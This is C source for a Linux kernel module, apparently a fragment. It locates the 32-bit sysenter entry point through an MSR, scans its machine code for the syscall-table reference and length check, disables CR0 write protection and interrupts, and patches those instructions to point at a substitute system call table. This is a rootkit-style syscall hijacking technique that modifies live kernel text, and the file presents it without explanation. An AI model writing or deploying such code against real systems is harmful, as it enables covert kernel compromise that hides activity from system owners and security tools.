#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/syscall.h>

#define BYTESCAN_LEN 1024

u32 *sct_len_ptr = NULL;
u32 **sct_ptr = NULL;

u32 my_sys_call_table[1024];
u32 my_sys_call_table_len;

#define WP_BIT (1 << 16)

static void
set_wp(int val) {
	unsigned int cr0;

	cr0 = read_cr0();
	val ? (cr0 |= WP_BIT) : (cr0 &= ~WP_BIT);
	write_cr0(cr0);
}

int
find_sysenter_sct_text_ptr(void) {
	u32 sysenter_entry;
	u8 *ptr;
	unsigned int i;

	/* get from msr register sysenter_entry pointer */
	rdmsrl(MSR_IA32_SYSENTER_EIP, sysenter_entry);
	ptr = (char *) sysenter_entry;

	for (i = 0; i < BYTESCAN_LEN; i++) {

		/* scan for: cmpl $(NR_syscalls), %eax
		 * get: syscall table size */
		if (!memcmp(ptr + i, "\x3d", 1)) {
			sct_len_ptr = (u32 *)(ptr + i + 1);
			break;
		}
	}

	for (; i < BYTESCAN_LEN + 1; i++) {

		/*  scan for: call *sys_call_table(,%eax,4)
		 *  get: syscall table address */
		if (!memcmp(ptr + i, "\xff\x14\x85", 3)) {
			sct_ptr = (u32 **)(ptr + i + 3);
			break;
		}
	}

	return ((sct_ptr == NULL || sct_len_ptr == NULL) ? 0 : 1);
}

void
patch_sysenter_sct_text(u32 *sct, u32 len) {
	asm volatile ("cli");
	set_wp(0);

	*sct_ptr = sct;
	*sct_len_ptr = len;

	set_wp(1);
	asm volatile ("sti");
}

